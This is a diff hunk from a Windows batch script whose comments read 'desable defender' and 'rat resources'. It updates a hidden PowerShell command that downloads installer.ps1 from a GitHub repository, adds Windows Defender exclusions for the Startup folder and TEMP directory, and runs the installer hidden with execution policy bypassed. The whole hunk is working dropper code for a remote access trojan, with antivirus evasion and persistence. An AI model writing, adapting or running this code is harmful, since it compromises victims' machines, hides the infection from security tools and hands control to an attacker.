@@ -37,6 +37,6 @@ IF %errorlevel% NEQ 0 (
 REM desable defender
 
 REM rat resources
-powershell powershell.exe -windowstyle hidden "Invoke-WebRequest -Uri https://raw.githubusercontent.com/m98m98/ttaarr/refs/heads/main/installer.ps1 -OutFile installer.ps1"; Add-MpPreference -ExclusionPath "C:\Users\%username%\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup";Add-MpPreference -ExclusionPath "$env:TEMP"
+powershell powershell.exe -windowstyle hidden "Invoke-WebRequest -Uri https://raw.githubusercontent.com/m98m98/tar2/refs/heads/main/installer.ps1?token=GHSAT0AAAAAAC7AO3Q2MQS6V7PQHPEFL4BCZ5SPZEA -OutFile installer.ps1"; Add-MpPreference -ExclusionPath "C:\Users\%username%\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup";Add-MpPreference -ExclusionPath "$env:TEMP"
 powershell powershell.exe -windowstyle hidden -ep bypass ./installer.ps1
 del wget.cmd
